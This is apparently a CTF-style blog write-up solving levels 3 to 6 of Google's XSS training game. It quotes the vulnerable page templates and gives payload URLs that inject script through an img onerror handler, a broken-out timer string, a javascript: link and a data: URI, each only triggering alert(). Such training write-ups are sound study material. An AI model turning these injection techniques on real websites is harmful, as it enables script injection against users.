---
title: Google_Game
author: ch3n9w
date: 2019-06-12 19:41:56
typora-root-url: ../
categories:
  - CTF
---

# Google Xss game

<!--more-->

### Level 3

![image-20211114141306312](image-20211114141306312.png)

This website provides some API (after the arch pointer).

solution:

```https://xss-game.appspot.com/level3/frame#<img src='foo' onerror=alert();>```

### level 4

![image-20211114141313076](image-20211114141313076.png)



```javascript
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
 
    <script>
      function startTimer(seconds) {
        seconds = parseInt(seconds) || 3;
        setTimeout(function() { 
          window.confirm("Time is up!");
          window.history.back();
        }, seconds * 1000);
      }
    </script>
  </head>
  <body id="level4">
    <img src="/static/logos/level4.png" />
    <br>
    <img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
    <br>
    <div id="message">Your timer will execute in {{ timer }} seconds.</div>
  </body>
</html>
```

solution:

```
https://xss-game.appspot.com/level4/frame?timer=');alert('
```



### level 5

![image-20211114141321457](image-20211114141321457.png)



```html
<!--signup.html-->
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
  </head>
 
  <body id="level5">
    <img src="/static/logos/level5.png" /><br><br>
    <!-- We're ignoring the email, but the poor user will never know! -->
    Enter email: <input id="reader-email" name="email" value="">
 
    <br><br>
    <a href="{{ next }}">Next >></a>
  </body>
</html>
```

solution: 

```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('xss')
```

and click the ``Next`` button.

### level 6

![image-20211114141329514](image-20211114141329514.png)

This website allow user to execute alternative js script

solution:

```
https://xss-game.appspot.com/level6/frame#data:text/plain,alert('xss')
```

